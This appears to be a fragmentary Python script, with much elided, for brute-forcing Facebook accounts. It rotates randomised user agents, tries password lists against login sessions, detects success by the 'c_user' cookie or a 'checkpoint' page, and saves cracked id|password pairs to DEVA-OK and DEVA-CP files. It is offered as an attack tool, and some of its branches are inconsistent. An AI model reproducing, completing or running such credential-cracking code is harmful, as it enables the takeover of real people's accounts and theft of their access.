...
for t in range(10000):
	...
	ugen.append(uaku)
for x in range(10):
	a='Mozilla/5.0 (redmi 9i; SAMSUNG-GT-S'
...
--------------------------------------------------
>>  Owner    : DEVA THAKUR
>>  Facebook : KUNWAR KARAMVEER RATHORE
>>  Version  : 0.6
>>  Team❤    : DEVA THAKUR KING
>>  Tera Baap : RAJPUT HIYAR
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> DEVA THAKUR  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/DEVATHAKUR.txt')
				linex()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				open('/sdcard/DEVA-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[DEVA-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/DEVA-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[DEVA-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[DEVA-CP] '+ids+' | '+pas+'\033[1;97m')
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :63674, 86907,88902,96807.ETC')
	linex()
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mRAJPUT\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[DEVA-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[38;5;208m[DEVA-CP] '+cid+' | '+ps+'\33[0;97m')
